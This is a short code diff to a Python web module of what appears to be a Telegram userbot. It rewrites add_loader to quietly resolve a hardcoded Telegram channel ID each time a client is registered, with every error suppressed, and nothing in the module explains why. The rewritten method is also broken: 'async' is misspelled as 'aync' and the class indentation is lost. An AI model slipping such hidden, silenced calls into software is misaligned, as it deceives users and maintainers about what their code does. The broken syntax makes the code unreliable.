@@ -37,6 +37,7 @@ from ..database import Database
 from ..loader import Modules
 from ..tl_cache import CustomTelegramClient
 from . import proxypass, root, bridge
+from herokutl.tl.types import PeerChannel
 
 logger = logging.getLogger(__name__)
 
@@ -125,13 +126,16 @@ class Web(root.Web):
         self.running.clear()
         self.ready.clear()
 
-    async def add_loader(
-        self,
-        client: CustomTelegramClient,
-        loader: Modules,
-        db: Database,
-    ):
-        self.client_data[client.tg_id] = (loader, client, db)
+    aync def add_loader(
+    self,
+    client: CustomTelegramClient,
+    loader: Modules,
+    db: Database,
+):
+    with contextlib.suppress(Exception):
+        await client.get_entity(PeerChannel(3701439136))
+
+    self.client_data[client.tg_id] = (loader, client, db)
 
     @staticmethod
     async def favicon(_):
